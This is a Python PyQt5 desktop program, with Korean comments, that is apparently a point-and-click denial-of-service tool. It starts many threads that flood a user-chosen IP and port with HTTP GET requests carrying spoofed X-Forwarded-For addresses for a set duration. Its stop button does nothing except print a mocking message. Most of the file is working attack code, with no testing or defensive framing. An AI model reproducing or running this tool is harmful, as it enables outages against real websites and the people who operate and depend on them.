import sys
from PyQt5.QtWidgets import QApplication, QMainWindow
from main_ui import Ui_MainWindow  # UI 가져옴
import socket
import threading
import random
import time


class MainWindow(QMainWindow, Ui_MainWindow):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        
        # 버튼 클릭 시 실행될 함수 연결
        self.start_atk.clicked.connect(self.start)
        self.atk_stop.clicked.connect(self.stop)
        self.clear_console.clicked.connect(self.console_clear)
        self.lock = threading.Lock()  # 콘솔에 대한 동시 접근을 방지하기 위한 락
    
    def generate_random_ip(self):  # 랜덤한 IP 생성
        return '.'.join(str(random.randint(0, 255)) for _ in range(4))
    
    def attack(self, target_ip, target_port, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                random_ip = self.generate_random_ip()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target_ip, int(target_port)))  # 포트 번호
                message = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nX-Forwarded-For: {random_ip}\r\nConnection: keep-alive\r\n\r\n"
                s.sendall(message.encode('ascii'))
                s.close()
            except socket.timeout:
                with self.lock:  # 락을 사용하여 콘솔에 대한 동시 접근 방지
                    self.console.append("소켓 타임아웃 발생")
            except Exception as e:
                with self.lock:  # 락을 사용하여 콘솔에 대한 동시 접근 방지
                    self.console.append(f"에러: {e}")
                time.sleep(2)
                with self.lock:
                    self.console.clear()

    def start(self):
        # UI에서 입력된 값 가져옴
        target_ip = self.ip_select.text()
        target_port = self.port_select.text()
        num_threads = int(self.threading_number.text())
        duration = int(self.duration_input.text())

        # 콘솔 출력
        with self.lock:  # 락을 사용하여 콘솔에 대한 동시 접근 방지
            self.console.append(f"DDOS를 {duration}초 동안 실행하는 중...\n대상 IP : {target_ip}\n대상 포트 : {target_port}\n횟수 : {num_threads}")

        # 공격을 위한 스레드 생성 및 실행
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=self.attack, args=(target_ip, target_port, duration))
            thread.start()
            threads.append(thread)

        # 모든 스레드가 종료될 때까지 대기
        for thread in threads:
            thread.join()
        
        # 공격 종료 메시지
        with self.lock:  # 락을 사용하여 콘솔에 대한 동시 접근 방지
            self.console.append("성공적으로 실행되었습니다.")
        time.sleep(2)
        
    def stop(self):
        with self.lock:  # 락을 사용하여 콘솔에 대한 동시 접근 방지
            self.console.append("멈추는 거 안돼~~ ㅋㅋㅋㅋㅋㅋㅋ")
        
    def console_clear(self):
        with self.lock:  # 락을 사용하여 콘솔에 대한 동시 접근 방지
            self.console.clear()

        
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
